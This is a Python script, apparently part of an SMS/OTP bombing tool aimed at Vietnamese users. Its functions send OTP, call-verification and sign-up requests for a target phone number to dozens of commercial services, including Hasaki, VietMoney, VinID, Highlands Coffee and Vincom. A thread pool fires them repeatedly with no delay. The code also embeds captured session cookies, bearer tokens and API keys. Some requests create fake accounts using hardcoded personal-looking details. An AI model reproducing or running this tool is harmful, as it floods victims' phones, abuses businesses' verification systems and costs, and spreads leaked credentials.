def hasaki():
    cookies = {
        'HASAKI_SESSID': '900e892e3fe58b9cb88bfe7fe64966b5',
        'form_key': '900e892e3fe58b9cb88bfe7fe64966b5',
        'sessionChecked': '1733543841',
    }

    headers = {
        'Host': 'api.hasaki.vn',
        # 'Cookie': 'HASAKI_SESSID=900e892e3fe58b9cb88bfe7fe64966b5; form_key=900e892e3fe58b9cb88bfe7fe64966b5; sessionChecked=1733543841',
        'content-type': 'application/json; charset=utf-8',
        'mobileappversion': '2.3.87',
        'mobileregion': 'VN',
        'accept': 'application/json',
        'mobileosversion': '15.8.2',
        'accept-language': 'vi-VN,vi;q=0.9',
        'mobilecartid': '0',
        'mobiledeviceid': '597F2031-B49F-4701-8A48-A94D58BA5DDB',
        'user-agent': 'Hasaki.vn/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'mobileplatform': 'ios',
    }

    params = {
        'username': sdt,
    }

    try:
        response = requests.get('https://api.hasaki.vn/mobile/v3/user/get-code-verify', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoney():
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'sms',
    }

    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoneycall():
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'call',
    }


    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEYCALL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEYCALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def go2joy():
    headers = {
        'Host': 'production-api.go2joy.vn',
        'Accept': '*/*',
        'Secret-Code': '7bc79fa5139b8266e12993014bb68911',
        'Localization': 'vi',
        'Accept-Language': 'vi-VN;q=1.0, en-VN;q=0.9, zh-Hans-VN;q=0.8, zh-Hant-VN;q=0.7',
        'Content-Type': 'application/json',
        'User-Agent': 'Hotel/15.58.2 (com.appromobile.Hotel; build:1056; iOS 15.8.2) Alamofire/5.9.1',
        'Device-Encode': '7dfc308364c9a4b362153e7f3db34334',
        'requester': 'mobile-app',
    }

    json_data = {
        'mobile': sdt,
        'countryCode': '84',
    }

    try:
        response = requests.post('https://production-api.go2joy.vn/api/v2/mobile/users/sendVerifyCode', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GO2JOY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GO2JOY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ivivu():
    headers = {
        'Host': 'apiportal.ivivu.com',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'capacitor://localhost',
        'cache-control': 'no-cache',
        'accept-language': 'vi-VN,vi;q=0.9',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    }

    json_data = {
        'phoneNumber': sdt,
        'password': '123123aA@',
        'password2': '123123aA@',
    }

    try:
        response = requests.post('https://apiportal.ivivu.com/api/account/RegisterByPhone', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("IVIVU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("IVIVU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def aeonmall():
    headers = {
        'Host': 'api.aeonmall-vietnam.com',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
        'lang': 'vi',
        'user-agent': 'AeonMall/2.37 (com.aeonmall-vietnam; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9, zh-Hans-VN;q=0.8, zh-Hant-VN;q=0.7',
    }

    data = {
        'birthday': '1999-12-21',
        'district_id': '71',
        'email': 'soeasyvn1337@gmail.com',
        'full_name': 'tran dat',
        'gender': '0',
        'identification_number': '1207036448',
        'introduction_store': '',
        'password': '123123aA@',
        'phone': sdt,
        'province_id': '6',
        'referrer_code': '',
        'register_mall_id': '15',
        'register_membership': '1',
        'ward_id': '1252',
    }

    try:
        response = requests.post('https://api.aeonmall-vietnam.com/api/loyalty/app/customers/register', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AEONMALL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AEONMALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def btaskee():
    headers = {
        'Host': 'api.btaskee.com',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'bTaskee/3290000 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accesskey': 'ZphFh0iUTaGLIYk1qR2vYQh4YcROIES3',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    random_email = generate_random_email()
    json_data = {
        'name': 'josh',
        'phone': sdt,
        'countryCode': '+84',
        'language': 'en',
        'isoCode': 'VN',
        'username': f'84{sdt[1:10]}',
        'type': 'ASKER',
        'loginType': 'password',
        'referralCode': '',
        'email': random_email,
    }

    response = requests.post('https://api.btaskee.com/api/v3/user-asker-vn/sign-up-customer-v2', headers=headers, json=json_data)
    headers = {
        'Host': 'api.btaskee.com',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'bTaskee/3290000 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accesskey': 'ZphFh0iUTaGLIYk1qR2vYQh4YcROIES3',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'countryCode': '+84',
    }

    try:
        response = requests.post(
            'https://api.btaskee.com/api/v3/user-asker-vn/resend-activation-code-v2',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BTASKEE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BTASKEE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinid(): #app OneU
    headers = {
        'Host': 'apex.vinid.net',
        'x-mn-app-version': '192.1',
        'referer': 'https://login.onemount.com/',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'x-device-id': '80B3877B-1560-4E93-B4B1-D779FCA00939',
        'x-channel': 'mBTvKSJfjzaLbtZ',
        'x-device-os-token': 'bW5nUXJqYjFxaWJoRVlra2RTbEVWbEswQ1d1ZGZOWXdHYStjY2dUajRCZ0Y1RzlWKzBVZXRrVzhzQS9BNXplMkNpcHNuajNtMmhmTVlRRU44Yjhobm9VTitwM0grOFJYOjQuNi4wOmNvbS52aW5ncm91cC5WaW5JREFwcDoxOTI6QUIyQUIzMUItRDZBNi00MEVBLThBMEItRThBM0MyRjVENTJGOjowMDAwMDAwMDAwMDoxNzM0NzY4MTY2',
        'origin': 'https://login.onemount.com',
        'x-mn-app-id': 'com.vingroup.VinIDApp',
        'x-mn-sdk-name': 'VinID',
        'accept-language': 'vi',
        'x-mn-sdk-version': '192.1',
        'x-mn-sdk-id': 'com.vingroup.VinIDApp',
        'x-request-id': '2ed6f1b8-f7ac-4ed2-a14f-b8f73b5feeae',
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'x-device-uuid': 'AB2AB31B-D6A6-40EA-8A0B-E8A3C2F5D52F',
        'x-mn-app-name': 'OneU',
    }

    json_data = {
        'phone_number': sdt_chuyen_doi,
        'is_register': False,
    }

    try:
        response = requests.post('https://apex.vinid.net/oneid/iam/v1/otp/sms/request', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINID | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinschool():
    headers = {
        'Host': 'one-api.vinschool.edu.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'cache-control': 'no-store',
        'user-agent': 'Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': sdt,
        'unique_id': '274889DD-7051-4F23-9A28-F54E73F77A9A',
    }

    try:
        response = requests.post(
            'https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINSCHOOL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINSCHOOL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def homeid():
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/7.3.0/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'asia.homeid',
        'user-agent': 'FirebaseAuth.iOS/7.3.0 asia.homeid/1.1.6 iPhone/15.8.2 hw/iPhone9_3',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyBMwQDLKUqLZskG_4QBWSU79RUCYeXclwQ',
    }

    json_data = {
        'iosReceipt': 'AEFDNu_9qDiFRHvwruvGQjzmiO9YoKu03VGru0yCGiM6oKh6PfOTvTNPb5S2uv2EPQeHYSj_aMc9G71N3IMexyRojZqWz5g2z9rTFplJn__93x-tJkJge7g',
        'iosSecret': '1UHmX596jgq1PjGV',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOMEID | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOMEID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def highlands():
    cookies = {
        '.diadiem.Session': 'CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU',
        'route': '1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
    }

    headers = {
        'Host': 'api-app.highlandscoffee.com.vn',
        # 'Cookie': '.diadiem.Session=CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU; route=1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
        'content-type': 'application/json',
        'accept': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjBhYmUxZmFlLWI4YzUtNDhmYy1iYzhjLTVlOTA5ODNjY2VmNyJ9.eyJVc2VyR3VpZCI6IkN1c3RvbWVyLzIiLCJEZXZpY2VHdWlkIjoiRGV2aWNlLzQiLCJMb2NhdGlvbkd1aWQiOiJMb2NhdGlvbi80IiwiS2V5RGV2aWNlIjoiRTJWQy1KTUwzLTRXWFEiLCJEZXZpY2VUeXBlIjoiMSIsIm5iZiI6MTczNDc3MTAyMCwiZXhwIjoxNzM3OTY3ODIwLCJpYXQiOjE3MzQ3NzEwMjAsImlzcyI6Imh0dHBzOi8vYXBpLWFwcC5oaWdobGFuZHNjb2ZmZWUuY29tLnZuIiwiYXVkIjoiaHR0cHM6Ly9hcGktYXBwLmhpZ2hsYW5kc2NvZmZlZS5jb20udm4ifQ.s1f5aqFBATZGDqgA69uFYle-UsEH_4mqdb8-3euaRXk',
        'x-auth-checksum': '14129e5f51e48ae7ff9d12116c80e1d33bf2c56e355412683ca33c17732e6012',
        'x-auth-timestamp': '1734771031306',
        'accept-language': 'vi',
        'x-auth-signature': 'b75377e9453f0644fce99ba40305dd1cf3371438cd03f36e92c4da19f3ca7493',
        'user-agent': 'PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'x-auth-nonce': '1734771031306155',
        'x-auth-devicecode': 'E2VC-JML3-4WXQ',
    }

    json_data = {
        'UserAccount': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HIGHLANDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HIGHLANDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vincom():
    cookies = {
        'cf_clearance': 'DyUVrzRbaqI_UGYS_10n_AmUDtM.sKg5zByyCGp4YrA-1733411009-1.2.1.1-J1x85x7ihBVVRJACM27LVhwL5qUgtELIE6FFwGd4eU_fksRgBxelc5mKTcl4F5UUxbtGL4QPmpYZ2tbOvpOCBNALQzeEkqBi8X83rgsHLuwQGhzSNKa1hDnFTjmnI2eggjVzCBNraNehsR33i8m_kSQ2IMqJG7weH59YPhGnMx_BfPVf6MfbRDwQ5AM44PEiSE4438LRwVWhQw53F8q.K_FQn7Ix8Aa8tWi.H3ZY30K93HbkCmTYlU5AElMUbgrdAHHtFUdS3RJASsWiRulXsO3hTrcfNqrSOuYXWho7_quOmWwhXwMPLCxGDdA7b8_bQAy2X9XVB78ingYtgsGa3fscP9Ics4ROqNv0c48WTc76WfhzmpxR2DirZ8POXdoQTogJaHvE0blHkA2mjwbmGA',
        'XSRF-TOKEN': 'eyJpdiI6IjhieEhpL3JBU3E5cUV3R1lYVCtpaEE9PSIsInZhbHVlIjoiU3F2VE85a2hDaXRBU2ttUjlKOFJ4MEdIM0dlTloxRWxJQXhwRjdxM3dHdkhlT3JtdWdQZFIvZTRZa0hTNlNBSm1keVRLVTFhcDZKTXdlL2F5dUJiYk9uYkdGZU9sZm1lY3VOdVBXM0NoU2g0TlpyUVBMbm5xNHFCSDZJUW5YMWsiLCJtYWMiOiIzYjlmNjViZTI2ZjZmZjBhODcxMzM3M2Y5OGFmMThlMmU3ZTUwMGQzNzk0ZTA4NTQ5NjAyNWFjZjQxZWU1MGY0IiwidGFnIjoiIn0%3D',
        'vcr_session': 'eyJpdiI6ImtVR3ZWcnQ5MEZ5NlRjdkNtV3k1dUE9PSIsInZhbHVlIjoiL09xSHRyME1NUlkwV3NlZ1M4N3E2NFZ5Nm02ekluNzRaczNFb0hqOW9sY2dNdWFVVTdPa3pGb1lSc1B3SHpuaDNUUk9EOUlObGF4czNCc2RGTEZHMU9xK3BOZ0RqZHdkL1NQR0hqbWJkdUZCVVhMK2xIQmJHNkxSYW50dlN3aDQiLCJtYWMiOiI2Y2VlNjIyMDczYTM1OGQ1NTIyY2ZkZmQ1OWVlYjUyZjRiNjhhNTM4OWM2ZjA4MDM4NDc0OGU4ODI1ODFkYWRiIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'cf_clearance=DyUVrzRbaqI_UGYS_10n_AmUDtM.sKg5zByyCGp4YrA-1733411009-1.2.1.1-J1x85x7ihBVVRJACM27LVhwL5qUgtELIE6FFwGd4eU_fksRgBxelc5mKTcl4F5UUxbtGL4QPmpYZ2tbOvpOCBNALQzeEkqBi8X83rgsHLuwQGhzSNKa1hDnFTjmnI2eggjVzCBNraNehsR33i8m_kSQ2IMqJG7weH59YPhGnMx_BfPVf6MfbRDwQ5AM44PEiSE4438LRwVWhQw53F8q.K_FQn7Ix8Aa8tWi.H3ZY30K93HbkCmTYlU5AElMUbgrdAHHtFUdS3RJASsWiRulXsO3hTrcfNqrSOuYXWho7_quOmWwhXwMPLCxGDdA7b8_bQAy2X9XVB78ingYtgsGa3fscP9Ics4ROqNv0c48WTc76WfhzmpxR2DirZ8POXdoQTogJaHvE0blHkA2mjwbmGA; XSRF-TOKEN=eyJpdiI6IjhieEhpL3JBU3E5cUV3R1lYVCtpaEE9PSIsInZhbHVlIjoiU3F2VE85a2hDaXRBU2ttUjlKOFJ4MEdIM0dlTloxRWxJQXhwRjdxM3dHdkhlT3JtdWdQZFIvZTRZa0hTNlNBSm1keVRLVTFhcDZKTXdlL2F5dUJiYk9uYkdGZU9sZm1lY3VOdVBXM0NoU2g0TlpyUVBMbm5xNHFCSDZJUW5YMWsiLCJtYWMiOiIzYjlmNjViZTI2ZjZmZjBhODcxMzM3M2Y5OGFmMThlMmU3ZTUwMGQzNzk0ZTA4NTQ5NjAyNWFjZjQxZWU1MGY0IiwidGFnIjoiIn0%3D; vcr_session=eyJpdiI6ImtVR3ZWcnQ5MEZ5NlRjdkNtV3k1dUE9PSIsInZhbHVlIjoiL09xSHRyME1NUlkwV3NlZ1M4N3E2NFZ5Nm02ekluNzRaczNFb0hqOW9sY2dNdWFVVTdPa3pGb1lSc1B3SHpuaDNUUk9EOUlObGF4czNCc2RGTEZHMU9xK3BOZ0RqZHdkL1NQR0hqbWJkdUZCVVhMK2xIQmJHNkxSYW50dlN3aDQiLCJtYWMiOiI2Y2VlNjIyMDczYTM1OGQ1NTIyY2ZkZmQ1OWVlYjUyZjRiNjhhNTM4OWM2ZjA4MDM4NDc0OGU4ODI1ODFkYWRiIiwidGFnIjoiIn0%3D',
        'origin': 'https://vincomapp-api-prod.vincom.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://vincomapp-api-prod.vincom.com.vn/api/documentation',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': '',
    }

    data = {
        'email': sdt,
    }

    try:
        response = requests.post(
            'https://vincomapp-api-prod.vincom.com.vn/api/v2/send-otp-sign-up',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINCOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINCOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cashbee():
    headers = {
        'Host': 'api.cashbee.site',
        # 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbee.top',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbee.top/',
        # 'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    data = {
        'phone': f'{sdt}',
        'type': '2',
        'ctype': '1',
        'chntoken': '7f38e65de6b47136eaa373feade6cd33',
    }
    try:
        response = requests.post('https://api.cashbee.site/h5/LoginMessage_ultimate', headers=headers, data=data).json()
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CASHBEE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CASHBEE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cashbar():
    headers = {
        'Host': 'api.cashbar.tech',
        # 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbar.work',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbar.work/',
        # 'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    data = {
        'phone': f'{sdt}',
        'type': '2',
        'ctype': '1',
        'chntoken': '7f38e65de6b47136eaa373feade6cd33',
    }

    try:
        response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CASHBAR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CASHBAR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)



functions = [
    tv360, vieon, myviettel, fptshop, pantio, befood, foodhubzl,
    vttelecom, vinwonders, hasaki, fahasa, medigozl,
    medigosms, ddmevabe, mocha, tatmart, hacom, liena, pasgo,
    vietloan, viettelpost, ghtk, pcspost, vuihoc,
    vnsc, goldenspoonssms, bibomart, thieuhoa, sbiz, guardian,
    boshop, gas24h, zl188, goldenspoonszl, goldenspoonszlresend,
    goldenspoonssmsresend, sapporopremiumbeer, hoangphuc, theciu,
    trungsoncarezl, trungsoncaresms, jollibee, kkfashion, formartvn,
    vndirect, thecoffeehouse, batdongsan, sapo, heyu,
    minhtuanmobile, locknlock, thamdangstore, homeid,
    thichsua, mocha2, hasaki, vietmoney, vietmoneycall,
    go2joy, ivivu, aeonmall, btaskee, vinid,
    highlands, cashbee, cashbar, vnscnor, guardiannor,
    sapporopremiumbeernor
]

with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(count):
        for func in functions:
            # Gọi hàm và gửi vào ThreadPoolExecutor
            executor.submit(func)
            # Nghỉ giữa các lần gọi hàm
            time.sleep(0)  # Điều chỉnh thời gian nghỉ tùy theo nhu cầu